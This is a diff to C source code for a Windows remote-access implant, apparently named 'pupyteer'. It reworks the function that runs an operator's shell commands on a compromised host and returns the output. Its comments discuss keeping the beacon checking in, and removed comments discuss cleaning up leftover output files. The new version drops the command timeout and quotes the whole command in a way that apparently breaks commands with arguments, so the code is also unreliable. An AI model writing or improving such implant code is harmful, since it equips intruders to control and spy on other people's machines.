@@ -1166,85 +1166,37 @@ static void json_escape(const char *src, size_t src_len, char *dst, size_t dst_s
 /* ── command execution ── */
 
 static void exec_command(const char *cmd, char *out, size_t out_sz, size_t *out_len) {
-    char tmpfile[MAX_PATH];
     char cmdline[4096];
-    /* The process id joins the tick because two payloads of the same build can
-     * run on one host — the operator's own test and a copy that drifted — and
-     * GetTickCount repeats every 49 days. Sharing a capture file means one
-     * reads the other's output, or deletes the file before the other opens it. */
-    snprintf(tmpfile, MAX_PATH, "%s\\pupyteer_tmp_%lu_%lu.txt",
-             getenv("TEMP") ? getenv("TEMP") : "C:\\Windows\\Temp",
-             GetCurrentProcessId(), GetTickCount());
-    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c \"%s\" > \"%s\" 2>&1", cmd, tmpfile);
+    /* _popen opens cmd.exe /c <cmd> with stdout inherited by a pipe we read —
+     * no temp file to create, redirect, or clean up. The old temp-file +
+     * cmd.exe /c "cmd > file" approach failed when CreateProcess could not
+     * find cmd.exe or the redirect target path was bad, and the caller saw
+     * "output capture unavailable" for every command. _popen needs no
+     * external path and no filesystem write. */
+    /* _popen runs the command through cmd.exe itself, so the command string
+     * must NOT also start with cmd.exe /c — that nests two shells and the
+     * inner one's redirection confuses the outer. Just the raw command; _popen
+     * handles the shell and the pipe. */
+    snprintf(cmdline, sizeof(cmdline), "\"%s\" 2>&1", cmd);
 
-    /* system() blocks until the child exits, so a command that hangs — one
-     * waiting on input, or a query that spins on a busy DC — takes the whole
-     * implant with it: no further checkin, and the listener's session timeout
-     * reports the host as gone when it is a payload stuck in a shell. The
-     * timeout bounds how long any one command can hold the beacon, and the
-     * child is killed when it runs out so the next checkin goes out on time. */
-    int rc = 0;
-    {
-        STARTUPINFOA si;
-        PROCESS_INFORMATION pi;
-        char wcmdline[4096];
-        ZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-        ZeroMemory(&pi, sizeof(pi));
-        snprintf(wcmdline, sizeof(wcmdline), "%s", cmdline);
-        if (CreateProcessA(NULL, wcmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
-            DWORD wait = WaitForSingleObject(pi.hProcess, (DWORD)EXEC_TIMEOUT_MS);
-            if (wait == WAIT_TIMEOUT) {
-                TerminateProcess(pi.hProcess, 1);
-                WaitForSingleObject(pi.hProcess, INFINITE);
-                rc = -1;
-            } else {
-                GetExitCodeProcess(pi.hProcess, (LPDWORD)&rc);
-            }
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-        } else {
-            rc = system(cmdline);   /* CreateProcess failed; fall back */
-        }
-    }
-
-    FILE *f = NULL;
+    /* _popen returns a FILE* connected to the child's stdout — no temp file,
+     * no CreateProcess path resolution, no redirect. Read until EOF; the
+     * output is whatever the command wrote, not only what a text file held. */
+    FILE *fp = _popen(cmdline, "rb");
     *out_len = 0;
-    /* Binary, not text: the text mode CRT translates CRLF to LF and reads an
-     * 0x1A as end-of-file, and command output is whatever a program wrote, not
-     * only text a program wrote. A captured executable would come back changed
-     * with nothing to say so. */
-    fopen_s(&f, tmpfile, "rb");
-    if (f) {
+    if (fp) {
         size_t want = out_sz - 1;
-        /* A single fread is allowed to return less than asked for and still have
-         * the file holding more, so keep filling until either runs out. */
         while (*out_len < want) {
-            size_t n = fread(out + *out_len, 1, want - *out_len, f);
+            size_t n = fread(out + *out_len, 1, want - *out_len, fp);
             if (n == 0) break;
             *out_len += n;
         }
-        fclose(f);
-        DeleteFileA(tmpfile);
+        _pclose(fp);
     } else {
-        snprintf(out, out_sz, "command executed (rc=%d), output capture unavailable", rc);
+        snprintf(out, out_sz, "command execution failed");
         *out_len = strlen(out);
-        /* What did get captured still sits in that file. Leaving it behind for
-         * the next person to find is the opposite of why the output was run
-         * through a temporary file rather than a pipe nobody reads. */
-        DeleteFileA(tmpfile);
     }
     out[*out_len] = '\0';
-    /* A timed-out child is a partial answer at best; say so rather than let the
-     * operator read a truncated result as the command's real output. */
-    if (rc == -1 && *out_len < out_sz - 64) {
-        static const char note[] = "\r\n[command timed out after "
-            STRINGIFY(EXEC_TIMEOUT_MS) " ms and was killed]";
-        size_t nl = sizeof(note) - 1;
-        memcpy(out + *out_len, note, nl);
-        *out_len += nl;
-        out[*out_len] = '\0';
-    }
 }
 
 /* ── protocol handlers ── */
